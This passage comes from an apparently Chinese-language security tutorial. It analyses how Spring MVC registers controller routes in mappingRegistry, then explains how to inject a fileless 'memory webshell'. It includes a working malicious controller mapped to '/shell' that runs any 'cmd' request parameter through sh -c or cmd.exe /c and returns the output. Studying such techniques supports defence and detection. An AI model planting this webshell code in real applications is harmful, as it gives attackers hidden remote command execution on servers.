计算用于匹配映射的“查找路径”（去掉contextPath、前缀等，必要时解码/规范化）</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">lookupPath</span> <span class="operator">=</span> initLookupPath(request);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 读锁：保证在映射表（mappingRegistry）可能被写入/刷新时，这里读取是线程安全的</span></span><br><span class="line">    <span class="built_in">this</span>.mappingRegistry.acquireReadLock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 3) 真正的匹配逻辑：从注册的 RequestMappingInfo -&gt; HandlerMethod 映射里</span></span><br><span class="line">        <span class="comment">//    找到与 lookupPath（以及HTTP方法、参数、Header、Consumes/Produces等条件）最匹配的那个</span></span><br><span class="line">        <span class="type">HandlerMethod</span> <span class="variable">handlerMethod</span> <span class="operator">=</span> lookupHandlerMethod(lookupPath, request);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 若找到，基于“已解析的Bean”重新创建一个 HandlerMethod（将beanName解析成真实bean实例，处理代理等）</span></span><br><span class="line">        <span class="keyword">return</span> (handlerMethod != <span class="literal">null</span> ? handlerMethod.createWithResolvedBean() : <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 5) 释放读锁</span></span><br><span class="line">        <span class="built_in">this</span>.mappingRegistry.releaseReadLock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>mappingRegistry</code> 中就存储着我们的路由信息。这里首先对 <code>mappingRegistry</code> 进行上锁，最后在 <code>finally</code> 块中进行解锁。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">this.mappingRegistry = &#123;AbstractHandlerMethodMapping$MappingRegistry@5936&#125; </span><br><span class="line"> registry = &#123;HashMap@5961&#125;  size = 3</span><br><span class="line">  &#123;RequestMappingInfo@5985&#125; &quot;&#123; [/error], produces [text/html]&#125;&quot; -&gt; &#123;AbstractHandlerMethodMapping$MappingRegistration@5986&#125; </span><br><span class="line">  &#123;RequestMappingInfo@5987&#125; &quot;&#123; [/error]&#125;&quot; -&gt; &#123;AbstractHandlerMethodMapping$MappingRegistration@5988&#125; </span><br><span class="line">  &#123;RequestMappingInfo@5989&#125; &quot;&#123;GET [/hello]&#125;&quot; -&gt; &#123;AbstractHandlerMethodMapping$MappingRegistration@5990&#125; </span><br><span class="line"> pathLookup = &#123;LinkedMultiValueMap@5962&#125;  size = 2</span><br><span class="line">  &quot;/hello&quot; -&gt; &#123;ArrayList@5977&#125;  size = 1</span><br><span class="line">  &quot;/error&quot; -&gt; &#123;ArrayList@5979&#125;  size = 2</span><br><span class="line"> nameLookup = &#123;ConcurrentHashMap@5963&#125;  size = 3</span><br><span class="line"> corsLookup = &#123;ConcurrentHashMap@5964&#125;  size = 0</span><br><span class="line"> readWriteLock = &#123;ReentrantReadWriteLock@5965&#125; &quot;java.util.concurrent.locks.ReentrantReadWriteLock@54fd94a0[Write locks = 0, Read locks = 0]&quot;</span><br><span class="line"> this$0 = &#123;RequestMappingHandlerMapping@5851&#125; </span><br></pre></td></tr></table></figure></div>

<p><code>lookupHandlerMethod</code> 方法根据我们访问的路径，调用 <code>mappingRegistry.getMappingsByDirectPath</code> 获取到了对应的路由。这里实际上就是从 <code>mappingRegistry</code> 的 <code>pathLookup</code> 中查找的。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;T&gt; <span class="title function_">getMappingsByDirectPath</span><span class="params">(String urlPath)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.pathLookup.get(urlPath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> HandlerMethod <span class="title function_">lookupHandlerMethod</span><span class="params">(String lookupPath, HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    List&lt;Match&gt; matches = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    List&lt;T&gt; directPathMatches = <span class="built_in">this</span>.mappingRegistry.getMappingsByDirectPath(lookupPath);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>也就是说，<strong>我们只需要向 <code>org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#mappingRegistry</code> 中添加恶意 Controller 的路由信息，就可以达到注入内存马的效果。</strong></p>
<h5 id="Controller-注册流程"><a href="#Controller-注册流程" class="headerlink" title="Controller 注册流程"></a>Controller 注册流程</h5><p>Spring 项目启动时会调用 <code>AbstractHandlerMethodMapping#registerHandlerMethod</code> 将我们的 Controller 注册到 <code>mappingRegistry</code> 中。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry.register(AbstractHandlerMethodMapping.java:632)</span><br><span class="line">at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.registerHandlerMethod(AbstractHandlerMethodMapping.java:332)</span><br><span class="line">at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.registerHandlerMethod(RequestMappingHandlerMapping.java:420)</span><br><span class="line">at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.registerHandlerMethod(RequestMappingHandlerMapping.java:76)</span><br><span class="line">at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.lambda$detectHandlerMethods$2(AbstractHandlerMethodMapping.java:299)</span><br><span class="line">at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$$Lambda$519.404588697.accept(Unknown Source:-1)</span><br><span class="line">at java.util.LinkedHashMap.forEach(LinkedHashMap.java:684)</span><br><span class="line">at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.detectHandlerMethods(AbstractHandlerMethodMapping.java:297)</span><br><span class="line">at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.processCandidateBean(AbstractHandlerMethodMapping.java:266)</span><br><span class="line">at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.initHandlerMethods(AbstractHandlerMethodMapping.java:225)</span><br><span class="line">at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.afterPropertiesSet(AbstractHandlerMethodMapping.java:213)</span><br><span class="line">at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.afterPropertiesSet(RequestMappingHandlerMapping.java:205)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1863)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1800)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:620)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractBeanFactory$$Lambda$199.2145896000.getObject(Unknown Source:-1)</span><br><span class="line">at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333)</span><br><span class="line">at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208)</span><br><span class="line">at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:955)</span><br><span class="line">at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:929)</span><br><span class="line">at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:591)</span><br><span class="line">at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:147)</span><br><span class="line">at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:732)</span><br><span class="line">at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:409)</span><br><span class="line">at org.springframework.boot.SpringApplication.run(SpringApplication.java:308)</span><br><span class="line">at org.springframework.boot.SpringApplication.run(SpringApplication.java:1300)</span><br><span class="line">at org.springframework.boot.SpringApplication.run(SpringApplication.java:1289)</span><br><span class="line">at com.example.HelloApplication.main(HelloApplication.java:9)</span><br></pre></td></tr></table></figure></div>

<p>首先 <code>initHandlerMethods</code> 方法遍历所有 Bean，传入 <code>processCandidateBean</code> 方法中来处理 Bean。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在 ApplicationContext 中扫描所有候选 Bean，检测并注册其处理器方法（HandlerMethod）。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #getCandidateBeanNames()   // 获取需要参与扫描的 Bean 名称列表</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #processCandidateBean      // 逐个 Bean 解析并注册映射</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #handlerMethodsInitialized // 全部注册完成后的回调钩子</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initHandlerMethods</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 遍历候选 Bean 名称</span></span><br><span class="line">    <span class="keyword">for</span> (String beanName : getCandidateBeanNames()) &#123;</span><br><span class="line">        <span class="comment">// 跳过作用域代理的“目标 Bean”定义（形如 &quot;scopedTarget.xxx&quot;），避免与代理 Bean 重复扫描/注册</span></span><br><span class="line">        <span class="keyword">if</span> (!beanName.startsWith(SCOPED_TARGET_NAME_PREFIX)) &#123;</span><br><span class="line">            <span class="comment">// 检测该 Bean 是否为“处理器”（如类/方法上有 @Controller/@RequestMapping 等）；</span></span><br><span class="line">            <span class="comment">// 若是，则解析其方法上的映射信息并注册为 HandlerMethod</span></span><br><span class="line">            processCandidateBean(beanName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 所有 HandlerMethod 注册完成后的回调（默认可为空；子类可用于日志、度量或二次处理）</span></span><br><span class="line">    handlerMethodsInitialized(getHandlerMethods());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>跟进 <code>processCandidateBean</code> 方法中，通过 <code>getType</code> 方法获取 <code>beanType</code>，后续判断该 Bean 是否为 <code>Handler</code> 对象，如果是的话，就将其传入 <code>detectHandlerMethods</code> 方法中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据给定的候选 bean 名称判定其类型，若识别为“处理器类型”则调用</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> #detectHandlerMethods&#125; 扫描并注册其处理方法。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 实现要点：通过 BeanFactory#getType 预测类型，避免提前创建 Bean 实例；</span></span><br><span class="line"><span class="comment"> * 若无法解析类型（懒加载/类加载异常等），则忽略并在 TRACE 级别记录日志。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> beanName 候选 bean 的名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 5.1</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #isHandler</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #detectHandlerMethods</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">processCandidateBean</span><span class="params">(String beanName)</span> &#123;</span><br><span class="line">    Class&lt;?&gt; beanType = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 尝试在不实例化 Bean 的前提下获取类型（预测类型），以避免触发构造/副作用</span></span><br><span class="line">        beanType = obtainApplicationContext().getType(beanName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">        <span class="comment">// 类型无法解析（多见于懒加载 Bean、类加载问题等）——忽略；必要时输出 TRACE 日志</span></span><br><span class="line">        <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">            logger.trace(<span class="string">&quot;Could not resolve type for bean &#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27;&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 若成功拿到类型，且该类型被判定为处理器（如带 @Controller/@RequestMapping）</span></span><br><span class="line">    <span class="keyword">if</span> (beanType != <span class="literal">null</span> &amp;&amp; isHandler(beanType)) &#123;</span><br><span class="line">        <span class="comment">// 基于 beanName 扫描并注册其处理方法映射（保持延迟创建、兼容代理类/AOP）</span></span><br><span class="line">        detectHandlerMethods(beanName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>detectHandlerMethods</code> 方法中，调用 <code>getMappingForMethod</code> 来获取到 <code>Map</code> 类 <code>methods</code>，构成为 <code>&lt;Method,RequestMapping&gt;</code>，后续通过遍历 <code>methods</code>，调用 <code>registerHandlerMethod</code> 方法执行了注册 Controller 的操作。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在指定的“处理器 Bean”中查找处理方法（handler methods）。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> handler 可以是 Bean 名称（String），也可以是实际的处理器实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #getMappingForMethod</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">detectHandlerMethods</span><span class="params">(Object handler)</span> &#123;</span><br><span class="line">    <span class="comment">// 1) 根据传入类型确定处理器的“类”：</span></span><br><span class="line">    <span class="comment">//    - 如果是 String，则视为 beanName，用 ApplicationContext#getType 预测类型（避免立刻实例化）；</span></span><br><span class="line">    <span class="comment">//    - 如果是实例，则直接取实例的 Class。</span></span><br><span class="line">    Class&lt;?&gt; handlerType = (handler <span class="keyword">instanceof</span> String ?</span><br><span class="line">            obtainApplicationContext().getType((String) handler) : handler.getClass());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (handlerType != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 2) 获取“用户真实类”（去掉 CGLIB/JDK 代理壳，拿到原始业务类）</span></span><br><span class="line">        Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 选择当前类中所有“有映射”的方法：</span></span><br><span class="line">        <span class="comment">//    MethodIntrospector.selectMethods 会遍历 userType 的可检查方法，并通过 MetadataLookup 回调</span></span><br><span class="line">        <span class="comment">//    为每个方法计算“映射信息 T”（子类定义的 T，例如 RequestMappingHandlerMapping 中是 RequestMappingInfo）。</span></span><br><span class="line">        Map&lt;Method, T&gt; methods = MethodIntrospector.selectMethods(userType,</span><br><span class="line">                (MethodIntrospector.MetadataLookup&lt;T&gt;) method -&gt; &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 3.1 计算该方法对应的映射信息（可能综合类级、方法级 @RequestMapping 及其它条件）</span></span><br><span class="line">                        <span class="keyword">return</span> getMappingForMethod(method, userType);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">                        <span class="comment">// 3.2 如果标注不合法或解析失败，抛出更明确的异常（包含类名与方法签名）</span></span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid mapping on handler class [&quot;</span> +</span><br><span class="line">                                userType.getName() + <span class="string">&quot;]: &quot;</span> + method, ex);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 打印映射日志：TRACE 级别更详细；否则用 mappingsLogger 的 DEBUG 级别</span></span><br><span class="line">        <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">            logger.trace(formatMappings(userType, methods));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappingsLogger.isDebugEnabled()) &#123;</span><br><span class="line">            mappingsLogger.debug(formatMappings(userType, methods));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5) 对每个“有映射”的方法进行最终注册</span></span><br><span class="line">        methods.forEach((method, mapping) -&gt; &#123;</span><br><span class="line">            <span class="comment">// 5.1 选择可调用的方法（考虑 AOP 代理、桥接方法/泛型擦除、接口方法到实现类方法的映射等）</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">invocableMethod</span> <span class="operator">=</span> AopUtils.selectInvocableMethod(method, userType);</span><br><span class="line">            <span class="comment">// 5.2 将 (handler, method, mapping) 注册到映射注册表（mappingRegistry）</span></span><br><span class="line">            <span class="comment">//     之后就能通过 URL/HTTP 方法等条件路由到该方法</span></span><br><span class="line">            registerHandlerMethod(handler, invocableMethod, mapping);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>持续跟进 <code>registerHandlerMethod</code>，最后注册 Controller 的方法为 <code>this.mappingRegistry.register</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为给定的处理器方法注册一个“唯一”的映射。框架在启动时对每个被检测到的</span></span><br><span class="line"><span class="comment"> * handler method 都会调用本方法完成注册。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> handler  处理器（可以是 bean 名称，也可以是实际实例）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> method   要注册的 Java 方法（控制器方法）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mapping  与该方法关联的映射条件（如路径、HTTP 方法、consumes/produces 等）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalStateException 若已存在“相同映射条件”的其他方法，触发冲突则抛出异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">registerHandlerMethod</span><span class="params">(Object handler, Method method, T mapping)</span> &#123;</span><br><span class="line">    <span class="comment">// 交给内部的映射注册表完成：并发写锁、唯一性校验、索引构建与缓存</span></span><br><span class="line">    <span class="built_in">this</span>.mappingRegistry.register(mapping, handler, method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="内存马实现"><a href="#内存马实现" class="headerlink" title="内存马实现"></a>内存马实现</h4><p>在 Spring2.5 - 3.1 中使用 <code>defaultAnnotationHandlerMapping</code> 处理URL映射。在 Spring3.1 之后使用 <code>RequestMappingHandlerMapping</code> 方法。在模拟注册 Controller 时，一般有三种方法。</p>
<h5 id="registryMapping"><a href="#registryMapping" class="headerlink" title="registryMapping"></a>registryMapping</h5><p>根据上面的源码分析，可以直接将 <code>Controller</code> 直接注册进 <code>registryMapping</code>。而想要将 <code>Controller</code> 注册去，那么我们就要获取到 <code>registryMapping</code>，该参数可以直接通过调用 <code>WebApplicationContext</code> 的 <code>getBean</code> 方法获取：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br></pre></td></tr></table></figure></div>

<p>在调用 <code>RegistryMapping</code> 注册时，需要传入三个参数：<code>RequestMappingInfo</code>、<code>Controller</code>、<code>Method</code>，因此这三个参数是我们所需要构造的</p>
<ul>
<li><p>创建 <code>RequestMappingInfo</code>，需要传入 <code>PatternsRequestCondition</code>（Controller 映射的 URL）和 <code>RequestMethodsRequestCondition</code>（HTTP的请求方法）</p>
  <div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/shell&quot;</span>);</span><br><span class="line"><span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line"><span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, ms, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>恶意 Controller 就是我们的核心，内容如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectedController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectedController</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cmd</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            response.getWriter().write(output);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">            response.getWriter().close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>关于代码里使用 <code>useDelimiter(“\A”)</code> 的意思</strong>：</p>
<p>正则表达式”<code>\A</code>“跟”<code>^</code>“的作用是一样的，代表文本的开头。这里表示：以文本的开头作为分隔符分割文本（默认是使用空格作为分隔符）。这样就能一下子获取整段文本的内容了，同时 <code>Scanner</code> 也在内部完成了 <code>InputStream</code> 转 <code>String</code> 的操作。节省书写代码，即不需要我们再写循环把 <code>inputStream</code> 的内容读到 <code>byte[]</code> 再放进 <code>String</code>。</p>
</li>
<li><p>最后需要创建 <code>Method</code>，就是我们想要触发的 Controller 中的方法，这里我们通过反射获取该方法：</p>
